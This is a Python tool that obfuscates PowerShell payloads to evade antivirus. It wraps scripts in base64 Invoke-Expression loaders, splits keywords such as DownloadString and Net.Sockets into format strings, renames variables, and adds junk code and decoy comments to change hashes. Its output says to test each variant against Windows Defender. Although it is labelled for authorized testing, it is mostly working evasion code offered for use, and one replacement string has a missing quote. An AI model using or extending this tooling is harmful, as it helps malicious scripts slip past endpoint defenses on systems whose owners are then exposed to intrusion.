#!/usr/bin/env python3
"""
PowerShell Payload Obfuscator
For Authorized Security Testing Only
"""

import base64
import random
import string
import re
import sys

class PayloadObfuscator:
    def __init__(self, payload_file):
        with open(payload_file, 'r') as f:
            self.payload = f.read()

    def random_string(self, length=8):
        """Generate random variable name"""
        return ''.join(random.choices(string.ascii_lowercase, k=length))

    def base64_obfuscate(self):
        """Obfuscate using base64 encoding"""
        print("[*] Applying Base64 obfuscation...")

        # Encode payload
        encoded = base64.b64encode(self.payload.encode('utf-16le')).decode()

        # Create obfuscated loader
        var1 = self.random_string()
        var2 = self.random_string()

        obfuscated = f"""
${var1} = '{encoded}'
${var2} = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(${var1}))
Invoke-Expression ${var2}
"""
        return obfuscated

    def string_split_obfuscate(self):
        """Split strings to avoid signature detection"""
        print("[*] Applying String Split obfuscation...")

        # Replace common keywords with split strings
        obfuscated = self.payload

        replacements = {
            'Invoke-Expression': '("{0}{1}{2}" -f "Inv","oke-Ex","pression")',
            'New-Object': '("{0}{1}" -f "New-Ob","ject")',
            'System.Net.WebClient': '("{0}{1}{2}" -f "System.Net",".",WebClient")',
            'DownloadString': '("{0}{1}" -f "Down","loadString")',
            'Net.Sockets': '("{0}{1}" -f "Net.","Sockets")',
            'GetStream': '("{0}{1}" -f "Get","Stream")',
        }

        for old, new in replacements.items():
            obfuscated = obfuscated.replace(old, new)

        return obfuscated

    def variable_renaming(self):
        """Rename variables to random names"""
        print("[*] Applying Variable Renaming...")

        obfuscated = self.payload

        # Find all variables
        vars_found = re.findall(r'\$\w+', obfuscated)
        vars_found = list(set(vars_found))

        # Create mapping to random names
        var_map = {}
        for var in vars_found:
            var_map[var] = '$' + self.random_string()

        # Replace variables
        for old_var, new_var in var_map.items():
            obfuscated = obfuscated.replace(old_var, new_var)

        return obfuscated

    def add_junk_code(self):
        """Add junk code to change file hash"""
        print("[*] Adding Junk Code...")

        junk_vars = [
            f'${self.random_string()} = "{self.random_string(16)}"',
            f'${self.random_string()} = {random.randint(1000, 9999)}',
            f'${self.random_string()} = Get-Date',
            f'${self.random_string()} = $env:USERNAME',
        ]

        junk = '\n'.join(random.sample(junk_vars, 3))

        return junk + '\n\n' + self.payload

    def comment_obfuscate(self):
        """Add random comments to change signature"""
        print("[*] Adding Random Comments...")

        comments = [
            '# System initialization',
            '# Loading modules',
            '# Configuration setup',
            '# Network connectivity check',
            '# Processing data',
        ]

        lines = self.payload.split('\n')
        result = []

        for i, line in enumerate(lines):
            if i % 5 == 0 and line.strip():
                result.append('# ' + random.choice(comments))
            result.append(line)

        return '\n'.join(result)

    def invoke_obfuscate(self):
        """Obfuscate Invoke-Expression calls"""
        print("[*] Obfuscating Invoke-Expression...")

        obfuscated = self.payload

        # Replace IEX with alternatives
        replacements = [
            '&("{1}{0}"-f"X","IE")',
            '&("{0}{1}"-f"I","EX")',
            '. ("{1}{0}"-f"X","IE")',
            'Invoke-Expression',
        ]

        for iex in ['IEX', 'Invoke-Expression']:
            if iex in obfuscated:
                obfuscated = obfuscated.replace(iex, random.choice(replacements))

        return obfuscated

    def full_obfuscate(self):
        """Apply multiple obfuscation techniques"""
        print("[*] Applying Full Obfuscation...")
        print("")

        # Apply techniques in sequence
        result = self.payload
        result = self.add_junk_code()
        result = self.comment_obfuscate()

        # Store for next operations
        temp = self.payload
        self.payload = result
        result = self.string_split_obfuscate()

        self.payload = result
        result = self.invoke_obfuscate()

        # Base64 encode the whole thing
        self.payload = result
        result = self.base64_obfuscate()

        # Restore original
        self.payload = temp

        return result

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 obfuscate_payload.py <payload_file>")
        print("Example: python3 obfuscate_payload.py fileless_payload.ps1")
        sys.exit(1)

    payload_file = sys.argv[1]

    print("=" * 60)
    print("PowerShell Payload Obfuscator")
    print("For Authorized Security Testing Only")
    print("=" * 60)
    print("")

    obfuscator = PayloadObfuscator(payload_file)

    # Generate different variants
    print("[*] Generating obfuscated variants...")
    print("")

    # Variant 1: Base64
    with open('/home/cyber/fileless_test/payload_base64.ps1', 'w') as f:
        f.write(obfuscator.base64_obfuscate())
    print("[+] Created: payload_base64.ps1")

    # Variant 2: String Split
    with open('/home/cyber/fileless_test/payload_string_split.ps1', 'w') as f:
        f.write(obfuscator.string_split_obfuscate())
    print("[+] Created: payload_string_split.ps1")

    # Variant 3: Variable Renaming
    with open('/home/cyber/fileless_test/payload_var_rename.ps1', 'w') as f:
        f.write(obfuscator.variable_renaming())
    print("[+] Created: payload_var_rename.ps1")

    # Variant 4: With Comments
    with open('/home/cyber/fileless_test/payload_commented.ps1', 'w') as f:
        f.write(obfuscator.comment_obfuscate())
    print("[+] Created: payload_commented.ps1")

    # Variant 5: Invoke Obfuscated
    with open('/home/cyber/fileless_test/payload_invoke_obf.ps1', 'w') as f:
        f.write(obfuscator.invoke_obfuscate())
    print("[+] Created: payload_invoke_obf.ps1")

    # Variant 6: Full Obfuscation
    with open('/home/cyber/fileless_test/payload_full_obf.ps1', 'w') as f:
        f.write(obfuscator.full_obfuscate())
    print("[+] Created: payload_full_obf.ps1")

    print("")
    print("[+] All obfuscated variants created successfully!")
    print("[*] Test each variant against Windows Defender")
    print("")

if __name__ == "__main__":
    main()
